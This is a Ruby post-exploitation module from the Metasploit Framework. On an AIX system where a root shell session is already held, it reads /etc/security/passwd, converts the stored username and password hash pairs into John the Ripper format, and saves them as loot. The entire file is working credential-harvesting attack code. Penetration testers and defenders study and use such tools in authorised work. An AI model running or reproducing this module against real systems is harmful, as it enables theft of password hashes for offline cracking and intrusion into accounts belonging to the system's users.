##
# ## This file is part of the Metasploit Framework and may be subject to
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'

class Metasploit3 < Msf::Post

  include Msf::Post::File
  include Msf::Post::Linux::Priv

  def initialize(info={})
    super( update_info( info,
        'Name'          => 'AIX Gather Dump Password Hashes',
        'Description'   => %q{ Post Module to dump the password hashes for all users on an AIX System},
        'License'       => MSF_LICENSE,
        'Author'        => ['theLightCosine'],
        'Platform'      => [ 'aix' ],
        'SessionTypes'  => [ 'shell' ]
      ))

  end


  def run
    if is_root?
      passwd_file = read_file("/etc/security/passwd")
      jtr = parse_aix_passwd(passwd_file)
      p = store_loot("aix.hashes", "text/plain", session, jtr, "aix_passwd.txt", "AIX Password File")
      vprint_status("Passwd saved in: #{p.to_s}")
    else
      print_error("You must run this module as root!")
    end

  end


  def parse_aix_passwd(aix_file)
    jtr_file = ""
    tmp = ""
    aix_file.each_line do |line|
      username = line.match(/(\w+:)/)
      if username
        tmp = username[0]
      end
      hash = line.match(/password = (\w+)/)
      if hash
        tmp << hash[1]
        jtr_file << "#{tmp}\n"
      end
    end
    return jtr_file
  end


end
